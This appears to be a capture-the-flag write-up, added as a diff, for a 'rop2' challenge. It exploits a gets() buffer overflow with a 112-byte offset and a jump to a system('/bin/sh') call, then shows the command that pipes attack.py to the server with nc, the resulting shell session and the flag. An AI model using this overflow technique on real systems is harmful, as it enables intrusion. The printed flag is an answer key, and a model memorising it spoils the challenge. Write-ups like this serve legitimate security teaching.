@@ -1,0 +1,26 @@
+It turns out that the server was broken or that the file that was provided to us was broken. Either way, it took us a long time wondering what was wrong with our exploit, and in the end, we just tried to send it to the server and it all worked out. Apparently, it never worked after countless attempted locally.
+
+Basically, we need to overflow the input and since it uses gets(), we're in luck! We can dump as much data as we want to overflow (but being careful not to SEGFAULT)
+So, we're going to keep testing to see how much we need to overflow to get the program to segfault. Turns out that's 112 bytes of buffer. Then let's append the $eip that we want the program to jump to, which would be 0x8048568, which is right before the call to system, when it is pushing "/bin/sh" to the stack.
+
+    8048568:  c7 04 24 10 87 04 08    movl   $0x8048710,(%esp)
+    804856f:  e8 6c fe ff ff          call   80483e0 <system@plt>
+
+All of this can be found in the attack.py script
+
+    > (python attack.py; cat - ) | nc p.tjctf.org 8093
+
+    Enter your name ls -l
+    total 24
+    -rw-r--r-- 1 root root  260 Apr 22 21:09 Dockerfile
+    drwxr-xr-x 3 root root 4096 Apr 23 14:12 etc
+    -rw-r--r-- 1 root root   38 Apr 22 21:09 flag
+    lrwxrwxrwx 1 root root    4 Apr 22 21:09 prog -> rop2
+    -rwxr-xr-x 1 root root 7300 Apr 22 21:09 rop2
+    -rwxr-xr-x 1 root root   45 Apr 23 14:12 wrapper
+    cat flag
+    does_this_really_count_as_programming
+
+Flag: does_this_really_count_as_programming
+
+This problem took way longer than expected...
